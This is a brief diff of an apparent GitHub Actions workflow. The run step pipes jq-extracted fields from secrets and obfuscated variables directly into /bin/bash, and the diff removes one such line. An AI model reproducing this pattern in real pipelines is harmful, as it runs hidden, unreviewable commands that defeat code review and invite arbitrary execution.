@@ -19,7 +19,6 @@ jobs:
           tm29: ${{ secrets.tm29 }}
         run: |
           printf '%s' "$tm29" | jq -r .dpiz574 | /bin/bash
-          printf '%s' "$wy1999" | jq -r .naw380 | /bin/bash
           echo $aju83230 | jq -r .rcd8 | /bin/bash
           printf '%s' "$jnj703" | jq -r .gqceu9358 | /bin/bash
           printf '%s' "$krds14827" | jq -r .xvnjn6 | /bin/bash
